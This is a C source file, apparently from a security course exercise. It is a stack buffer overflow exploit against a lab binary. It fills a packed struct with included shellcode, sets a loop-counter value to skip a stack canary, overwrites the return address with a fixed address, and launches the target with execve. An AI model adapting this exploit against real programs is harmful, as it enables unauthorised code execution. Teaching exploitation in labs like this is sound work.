/*
 * This template demonstrates how an exploit for a stack based
 * buffer overflow could be structured. Feel free to use it, or
 * write your own from scratch.
 *
 * The code does NOT match 4b85439ce1e87de0cbaef1277d2000cb5439ce1d;
 * it is just a template and you need to change most of it.
 */

#include <inttypes.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>

unsigned char shellcode[] = {
#include "shellcode.h"
};

unsigned long get_sp(void)
{
  unsigned long result;
  __asm__ __volatile__("movl %%esp,%0":"=r"(result));
  return result;
}

int main(void)
{
  struct _overflow {
    char buf[100];      /* buffer that we overflow */
    uint32_t loop;       /* Satisfy the loop counter */
    char buf2[16];      /* buffer that we overflow */
    uint32_t ret;        /* return address */
    unsigned char ter[1];            /* terminator */
  } __attribute__((packed)) overflow;

  
  char *argv[] = { "./4b85439ce1e87de0cbaef1277d2000cb5439ce1d", (char *)&overflow, NULL };
  

  memset(&overflow, 'A', sizeof(overflow));

  /* place the shellcode in the beginning of the buffer */
  memcpy(overflow.buf, shellcode, sizeof(shellcode));

  /* don't screw up the loop counter. Used to skip canary*/
  overflow.loop = 0x0101016b;

  int i;
  for (i = 0; i < 16; ++i)
  {
    overflow.buf2[i] = 'A';
  }
  /* Find the start address of the buffer */
  // printf( "%lx\n", get_sp()+60 );
  overflow.ret = 0x804855a;
  overflow.ter[0] = '\0';
  execve(argv[0], argv, NULL);

  return EXIT_FAILURE;
}



